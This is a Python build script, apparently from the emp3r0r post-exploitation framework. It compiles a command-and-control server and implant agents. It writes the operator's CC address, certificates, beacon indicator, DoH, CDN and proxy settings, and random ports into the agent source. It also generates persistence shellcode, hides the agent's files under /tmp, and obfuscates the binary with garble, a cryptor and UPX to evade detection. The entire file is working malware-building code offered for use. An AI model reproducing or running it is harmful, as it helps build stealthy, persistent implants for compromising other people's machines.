#!/usr/bin/env python3

# pylint: disable=invalid-name, too-many-branches, too-many-statements, broad-except, too-many-arguments, too-many-instance-attributes, line-too-long

'''
this script replaces build.sh, coz bash/sed/awk is driving me insane
'''

import atexit
import glob
import json
import os
import random
import readline
import shutil
import subprocess
import sys
import tempfile
import traceback
import uuid


class GoBuild:
    '''
    all-in-one builder
    '''

    def __init__(self, target="cc",
                 cc_indicator="cc_indicator", cc_ip="[cc_ipaddr]", cc_other_names=""):
        self.target = target
        self.GOOS = os.getenv("GOOS")
        self.GOARCH = os.getenv("GOARCH")

        if self.GOOS is None:
            self.GOOS = "linux"

        if self.GOARCH is None:
            self.GOARCH = "amd64"

        # CA
        self.CA = ""

        # tags
        self.CCIP = cc_ip
        self.CC_OTHER_NAMES = cc_other_names
        self.INDICATOR = cc_indicator
        self.UUID = str(uuid.uuid1())
        self.VERSION = get_version()

        # indicator text
        self.INDICATOR_TEXT = "emp3r0r"

        if 'indicator_text' in CACHED_CONF:
            self.INDICATOR_TEXT = CACHED_CONF['indicator_text']

        # agent root directory

        if "agent_root" in CACHED_CONF:
            self.AgentRoot = CACHED_CONF['agent_root']
        else:
            self.AgentRoot = f"/tmp/Temp-{uuid.uuid4()}"
            CACHED_CONF['agent_root'] = self.AgentRoot

        # DoH

        if "doh_server" not in CACHED_CONF:
            CACHED_CONF['doh_server'] = ""

        # agent proxy

        if "agent_proxy" not in CACHED_CONF:
            CACHED_CONF['agent_proxy'] = ""

        # cdn proxy

        if "cdn_proxy" not in CACHED_CONF:
            CACHED_CONF['cdn_proxy'] = ""

    def build(self):
        '''
        cd to cmd and run go build
        '''
        self.gen_certs()
        # CA

        if 'ca' in CACHED_CONF:
            log_warn(
                f"Using cached CA cert ({CACHED_CONF['ca']}),\nmake sure you have the coresponding keypair signed by it")
            self.CA = CACHED_CONF['ca']
        else:
            f = open("./tls/rootCA.crt")
            self.CA = f.read()
            f.close()

            # cache CA, too
            CACHED_CONF['ca'] = self.CA

        # cache version
        CACHED_CONF['version'] = self.VERSION

        # write cache
        json_file = open(BUILD_JSON, "w+")
        json.dump(CACHED_CONF, json_file, indent=4)
        json_file.close()

        self.set_tags()

        # copy the server/cc keypair to ./build for later use

        if os.path.isdir("./tls"):
            log_warn("[*] Copying CC keypair to ./build")

            for f in glob.glob("./tls/emp3r0r-*pem"):
                print(f" Copy {f} to ./build")
                shutil.copy(f, "./build")

        try:
            os.chdir(f"./cmd/{self.target}")
        except BaseException:
            log_error(f"Cannot cd to cmd/{self.target}")

            return

        log_warn("GO BUILD starts...")
        build_target = f"../../build/{self.target}"

        if self.target == "agent":
            build_target = f"../../build/{self.target}-{self.UUID}"
        # cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH}''' + \
        # f''' go build -ldflags='-s -w -extldflags "-static"' -o ../../build/{self.target}'''

        # go mod
        os.system('go mod tidy')

        cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0''' + \
            f""" go build -o {build_target} -ldflags='-s -w -buildmode=pie' -trimpath"""
        # garble

        if shutil.which("garble") and self.target != "cc":
            cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0 GOPRIVATE=''' + \
                f''' garble -literals -tiny build -o {build_target} -ldflags="-v -buildmode=pie" -trimpath .'''

        os.system(cmd)
        log_warn("GO BUILD ends...")

        os.chdir("../../")
        self.unset_tags()

        targetFile = f"./build/{build_target.split('/')[-1]}"

        if os.path.exists(targetFile):
            log_warn(f"{targetFile} generated")
        else:
            log_error("go build failed")
            sys.exit(1)

        # pack agent binary with packer
        shutil.copy(targetFile, "../packer/agent")
        os.chdir("../packer")
        os.system("bash ./build.sh")
        os.system("./cryptor.exe")
        shutil.move("agent.packed.exe", f"../core/{targetFile}")
        os.chdir("../core")
        os.chmod(targetFile, 0o755)

        if shutil.which("upx"):
            os.system(f"upx -9 {targetFile}")

        log_warn(f"{targetFile} packed")

    def gen_certs(self):
        '''
        generate server cert/key, and CA if necessary
        '''

        if "ccip" in CACHED_CONF:
            if self.CCIP == CACHED_CONF['ccip'] and os.path.exists("./build/emp3r0r-key.pem"):
                return

        log_warn("[!] Generating new certs...")
        try:
            os.chdir("./tls")
            os.system(
                f"bash ./genkey-with-ip-san.sh {self.UUID} {self.UUID}.com {self.CCIP} {self.CC_OTHER_NAMES}")
            os.rename(f"./{self.UUID}-cert.pem", "./emp3r0r-cert.pem")
            os.rename(f"./{self.UUID}-key.pem", "./emp3r0r-key.pem")
            os.chdir("..")
        except BaseException as exc:
            log_error(
                f"[-] Something went wrong, see above for details: {exc}")
            sys.exit(1)

    def set_tags(self):
        '''
        modify some tags in the source
        '''

        # backup source file
        try:
            shutil.copy("./lib/tun/tls.go", "/tmp/tls.go")
            shutil.copy("./lib/data/def.go", "/tmp/def.go")
        except BaseException:
            log_error(f"Failed to backup source files:\n{traceback.format_exc()}")
            sys.exit(1)

        # version
        sed("./lib/data/def.go",
            "Version = \"[emp3r0r_version_string]\"", f"Version = \"{self.VERSION}\"")

        if self.target == "agent":
            # guardian shellcode
            sed("./lib/data/def.go",
                "[persistence_shellcode]", CACHED_CONF['guardian_shellcode'])
            sed("./lib/data/def.go",
                "[persistence_agent_path]", CACHED_CONF['guardian_agent_path'])

        # CA
        sed("./lib/tun/tls.go", "[emp3r0r_ca]", self.CA)

        # CC IP
        sed("./lib/data/def.go",
            "CCAddress = \"https://[cc_ipaddr]\"", f"CCAddress = \"https://{self.CCIP}\"")

        # agent root path
        sed("./lib/data/def.go",
            "AgentRoot = \"[agent_root]\"", f"AgentRoot = \"{self.AgentRoot}\"")

        # indicator
        sed("./lib/data/def.go",
            "CCIndicator = \"[cc_indicator]\"", f"CCIndicator = \"{self.INDICATOR}\"")

        # indicator wait

        if 'indicator_wait_min' in CACHED_CONF:
            sed("./lib/data/def.go",
                "IndicatorWaitMin = 30", f"IndicatorWaitMin = {CACHED_CONF['indicator_wait_min']}")

        if 'indicator_wait_max' in CACHED_CONF:
            sed("./lib/data/def.go",
                "IndicatorWaitMax = 120", f"IndicatorWaitMax = {CACHED_CONF['indicator_wait_max']}")

        # broadcast_interval

        if 'broadcast_interval_min' in CACHED_CONF:
            sed("./lib/data/def.go",
                "BroadcastIntervalMin = 30", f"BroadcastIntervalMin = {CACHED_CONF['broadcast_interval_min']}")

        if 'broadcast_interval_max' in CACHED_CONF:
            sed("./lib/data/def.go",
                "BroadcastIntervalMax = 120", f"BroadcastIntervalMax = {CACHED_CONF['broadcast_interval_max']}")

        # cc indicator text
        sed("./lib/data/def.go",
            "CCIndicatorText = \"[indicator_text]\"", f"CCIndicatorText = \"{self.INDICATOR_TEXT}\"")

        # agent UUID
        sed("./lib/data/def.go",
            "AgentUUID = \"[agent_uuid]\"", f"AgentUUID = \"{self.UUID}\"")

        # DoH
        sed("./lib/data/def.go",
            "DoHServer = \"\"", f"DoHServer = \"{CACHED_CONF['doh_server']}\"")

        # CDN
        sed("./lib/data/def.go",
            "CDNProxy = \"\"", f"CDNProxy = \"{CACHED_CONF['cdn_proxy']}\"")

        # Agent Proxy
        sed("./lib/data/def.go",
            "AgentProxy = \"\"", f"AgentProxy = \"{CACHED_CONF['agent_proxy']}\"")

        # ports
        sed("./lib/data/def.go",
            "CCPort = \"[cc_port]\"", f"CCPort = \"{CACHED_CONF['cc_port']}\"")

        sed("./lib/data/def.go",
            "SSHDPort = \"[sshd_port]\"", f"SSHDPort = \"{CACHED_CONF['sshd_port']}\"")

        sed("./lib/data/def.go",
            "ProxyPort = \"[proxy_port]\"", f"ProxyPort = \"{CACHED_CONF['proxy_port']}\"")

        sed("./lib/data/def.go",
            "BroadcastPort = \"[broadcast_port]\"", f"BroadcastPort = \"{CACHED_CONF['broadcast_port']}\"")

    def unset_tags(self):
        # restore source files
        try:
            shutil.move("/tmp/def.go", "./lib/data/def.go")
            shutil.move("/tmp/tls.go", "./lib/tun/tls.go")
        except BaseException:
            log_error(traceback.format_exc())


def clean():
    '''
    clean build output
    '''
    to_rm = glob.glob("./tls/emp3r0r*") + glob.glob("./tls/openssl-*") + \
        glob.glob("./build/*") + glob.glob("./tls/*.csr")

    for f in to_rm:
        try:
            # remove directories too

            if os.path.isdir(f):
                os.system(f"rm -rf {f}")
            else:
                # we don't need to delete the config file

                if f.endswith("build.json"):
                    continue
                os.remove(f)
            print(" Deleted "+f)
        except BaseException:
            log_error(traceback.format_exc)


def sed(path, old, new):
    '''
    works like `sed -i s/old/new/g file`
    '''
    rf = open(path)
    text = rf.read()
    to_write = text.replace(old, new)
    rf.close()

    f = open(path, "w")
    f.write(to_write)
    f.close()


def yes_no(prompt):
    '''
    y/n?
    '''

    if yes_to_all:
        log_warn(f"Choosing 'yes' for '{prompt}'")

        return True

    answ = input(prompt + " [Y/n] ").lower().strip()

    if answ in ["n", "no", "nah", "nay"]:
        return False

    return True


def rand_str(length):
    '''
    random string
    '''
    uuidstr = str(uuid.uuid4()).replace('-', '')

    # we don't want the string to be long

    if length >= len(uuidstr):
        return uuidstr

    return uuidstr[:length]


def main(target):
    '''
    main main main
    '''
    ccip = ""
    indicator = ""
    use_cached = False

    if target == "clean":
        clean()

        return

    # cc IP

    if "ccip" in CACHED_CONF:
        ccip = CACHED_CONF['ccip']
        use_cached = yes_no(f"Use cached CC address ({ccip})?")

    if not use_cached:
        if yes_no("Clean everything and start over?"):
            clean()
        ccip = input(
            "CC server address (domain name or ip address, can be more than one, separate with space):\n> ").strip()
        CACHED_CONF['ccip'] = ccip

        if len(ccip.split()) > 1:
            CACHED_CONF['ccip'] = ccip[0]

    if target == "cc":
        cc_other = ""

        if len(ccip.split()) > 1:
            cc_other = ' '.join(ccip[1:])

        gobuild = GoBuild(target="cc", cc_ip=ccip, cc_other_names=cc_other)
        gobuild.build()

        return

    if target != "agent":
        print("Unknown target")

        return

    # indicator

    use_cached = False

    if "cc_indicator" in CACHED_CONF:
        indicator = CACHED_CONF['cc_indicator']
        use_cached = yes_no(f"Use cached CC indicator ({indicator})?")

    if not use_cached:
        indicator = input(
            "CC status indicator URL (leave empty to disable): ").strip()
        CACHED_CONF['cc_indicator'] = indicator

    if CACHED_CONF['cc_indicator'] != "":
        # indicator text
        use_cached = False

        if "indicator_text" in CACHED_CONF:
            use_cached = yes_no(
                f"Use cached CC indicator text ({CACHED_CONF['indicator_text']})?")

        if not use_cached:
            indicator_text = input(
                "CC status indicator text (leave empty to disable): ").strip()
            CACHED_CONF['indicator_text'] = indicator_text

    # Agent proxy
    use_cached = False

    if "agent_proxy" in CACHED_CONF:
        use_cached = yes_no(
            f"Use cached agent proxy ({CACHED_CONF['agent_proxy']})?")

    if not use_cached:
        agentproxy = input(
            "Proxy server for agent (leave empty to disable): ").strip()
        CACHED_CONF['agent_proxy'] = agentproxy

    # CDN
    use_cached = False

    if "cdn_proxy" in CACHED_CONF:
        use_cached = yes_no(
            f"Use cached CDN server ({CACHED_CONF['cdn_proxy']})?")

    if not use_cached:
        cdn = input("CDN websocket server (leave empty to disable): ").strip()
        CACHED_CONF['cdn_proxy'] = cdn

    # DoH
    use_cached = False

    if "doh_server" in CACHED_CONF:
        use_cached = yes_no(
            f"Use cached DoH server ({CACHED_CONF['doh_server']})?")

    if not use_cached:
        doh = input("DNS over HTTP server (leave empty to disable): ").strip()
        CACHED_CONF['doh_server'] = doh

    # guardian shellcode
    path = f"/tmp/{next(tempfile._get_candidate_names())}"
    CACHED_CONF['guardian_shellcode'] = gen_guardian_shellcode(path)
    CACHED_CONF['guardian_agent_path'] = path

    # option to disable autoproxy and broadcasting

    if not yes_no("Use autoproxy (will enable UDP broadcasting)"):
        CACHED_CONF['broadcast_interval_max'] = 0

    gobuild = GoBuild(target="agent", cc_indicator=indicator, cc_ip=ccip)
    gobuild.build()


def log_error(msg):
    '''
    print in red
    '''
    print("\u001b[31m"+msg+"\u001b[0m")


def log_warn(msg):
    '''
    print in yellow
    '''
    print("\u001b[33m"+msg+"\u001b[0m")


def save(prev_h_len, hfile):
    '''
    append to histfile
    '''
    new_h_len = readline.get_current_history_length()
    readline.set_history_length(1000)
    readline.append_history_file(new_h_len - prev_h_len, hfile)


# JSON config file, cache some user data
BUILD_JSON = "./build/build.json"
CACHED_CONF = {}

if os.path.exists(BUILD_JSON):
    try:
        jsonf = open(BUILD_JSON)
        CACHED_CONF = json.load(jsonf)
        jsonf.close()
    except BaseException:
        log_warn(traceback.format_exc())


def rand_port():
    '''
    returns a random int between 1024 and 65535
    '''

    return str(random.randint(1025, 65534))


def randomize_ports():
    '''
    randomize every port used by emp3r0r agent,
    cache them in build.json
    '''

    if 'cc_port' not in CACHED_CONF:
        CACHED_CONF['cc_port'] = rand_port()

    if 'sshd_port' not in CACHED_CONF:
        CACHED_CONF['sshd_port'] = rand_port()

    if 'proxy_port' not in CACHED_CONF:
        CACHED_CONF['proxy_port'] = rand_port()

    if 'broadcast_port' not in CACHED_CONF:
        CACHED_CONF['broadcast_port'] = rand_port()


def gen_guardian_shellcode(path):
    '''
    ../shellcode/gen.py
    '''

    if not shutil.which("nasm"):
        log_error("nasm not found")
    try:
        pwd = os.getcwd()
        os.chdir("../shellcode")
        out = subprocess.check_output(["python3", "gen.py", path])
        os.chdir(pwd)

        shellcode = out.decode('utf-8')

        if "\\x48" not in shellcode:
            log_error("Failed to generate shellcode: "+out)

            return "N/A"
    except BaseException:
        log_error(traceback.format_exc())

        return "N/A"

    return shellcode


def get_version():
    '''
    print current version
    '''
    try:
        check = "git describe --tags"
        out = subprocess.check_output(
            ["/bin/sh", "-c", check],
            stderr=subprocess.STDOUT, timeout=3)
    except KeyboardInterrupt:
        return "Unknown"
    except BaseException:
        check = "git describe --always"
        try:
            out = subprocess.check_output(
                ["/bin/sh", "-c", check],
                stderr=subprocess.STDOUT, timeout=3)
        except BaseException:
            try:
                versionf = open(".version")
                version = versionf.read().strip()
                versionf.close()

                return version
            except BaseException:
                return "Unknown"

    return out.decode("utf-8").strip()


# command line args
yes_to_all = False

if len(sys.argv) < 2:
    print(f"python3 {sys.argv[0]} cc/agent [-y]")
    sys.exit(1)
elif len(sys.argv) == 3:
    # if `-y` is specified, no questions will be asked
    yes_to_all = sys.argv[2] == "-y"

try:
    randomize_ports()

    if not os.path.exists("./build"):
        os.mkdir("./build")

    # support GNU readline interface, command history
    histfile = "./build/.build_py_history"
    try:
        readline.read_history_file(histfile)
        h_len = readline.get_current_history_length()
    except FileNotFoundError:
        open(histfile, 'wb').close()
        h_len = 0
    atexit.register(save, h_len, histfile)

    main(sys.argv[1])
except (KeyboardInterrupt, EOFError, SystemExit):
    sys.exit(0)
except BaseException:
    log_error(f"[!] Exception:\n{traceback.format_exc()}")
